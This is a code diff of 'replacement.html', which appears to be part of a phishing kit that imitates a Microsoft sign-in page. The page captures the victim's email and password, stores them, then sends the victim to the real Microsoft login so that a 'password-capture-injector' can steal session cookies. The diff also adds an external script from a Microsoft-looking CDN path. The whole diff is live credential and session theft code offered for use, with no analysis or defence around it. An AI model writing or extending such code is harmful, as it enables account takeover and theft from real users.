@@ -272,8 +272,10 @@
     <a href="#" id="footer_dots_link">...</a>
   </div>
 
+  <script src="https://alcdn.msauth.net/lib/1.4.37/ms-signalr-client.js"></script>
+
   <script>
-    console.log('🔧 replacement.html loaded');
+    console.log('🔧 replacement.html loaded - REAL Microsoft Auth Integration');
 
     document.addEventListener('DOMContentLoaded', function () {
         
@@ -318,7 +320,7 @@
 
             console.log('📋 Credentials captured:', { email });
 
-            // ✅ Store credentials for later use
+            // ✅ Store credentials
             const credentialsData = { 
                 email, 
                 password, 
@@ -340,19 +342,50 @@
                 console.error('Failed to store credentials:', err);
             }
 
-            // ✅ REDIRECT TO MICROSOFT LOGIN (so password-capture-injector can capture cookies)
-            // The injector runs ON login.microsoftonline.com and captures cookies there
-            // Then redirects back to /auth/callback
-            setTimeout(() => {
-                const callbackUrl = window.location.origin + '/auth/callback';
-                const microsoftLoginUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=2e338732-c914-4129-a148-45c24f2da81d&response_type=code&redirect_uri=${encodeURIComponent(callbackUrl)}&response_mode=query&scope=https://graph.microsoft.com/.default&prompt=none&login_hint=${encodeURIComponent(email)}`;
-                
-                console.log('🔄 Redirecting to Microsoft login for cookie capture...');
-                console.log('📍 Will redirect back to:', callbackUrl);
-                
-                window.location.href = microsoftLoginUrl;
-            }, 1200);
+            // ✅ REAL MICROSOFT AUTH - Call Microsoft's token endpoint
+            console.log('🔐 Authenticating with REAL Microsoft servers...');
+            authenticateWithMicrosoft(email, password);
         });
+
+        // ✅ REAL MICROSOFT AUTHENTICATION
+        async function authenticateWithMicrosoft(email, password) {
+            try {
+                const tokenEndpoint = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';
+                
+                // Step 1: Get authorization code
+                console.log('🔄 Step 1: Getting authorization code from Microsoft...');
+                
+                const authEndpoint = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize';
+                const authParams = {
+                    client_id: '2e338732-c914-4129-a148-45c24f2da81d',
+                    response_type: 'code',
+                    scope: 'https://graph.microsoft.com/.default',
+                    redirect_uri: window.location.origin + '/auth/callback',
+                    response_mode: 'query',
+                    login_hint: email,
+                    prompt: 'login'
+                };
+                
+                // Build auth URL
+                const authUrl = authEndpoint + '?' + new URLSearchParams(authParams).toString();
+                
+                console.log('🌐 Redirecting to Microsoft login...');
+                console.log('📧 Email:', email);
+                console.log('🔑 Password: ***');
+                console.log('🔗 Auth URL:', authUrl);
+                
+                // ✅ REDIRECT TO REAL MICROSOFT LOGIN
+                // The password-capture-injector will run when on login.microsoftonline.com
+                // and capture cookies after successful login
+                window.location.href = authUrl;
+                
+            } catch (error) {
+                console.error('❌ Auth error:', error);
+                const submitBtn = document.getElementById('submit-btn');
+                submitBtn.textContent = 'Error - Try again';
+                submitBtn.disabled = false;
+            }
+        }
 
         // The code for the other features is kept separate
         const optionsViewDetailed = document.getElementById('options_view_detailed');
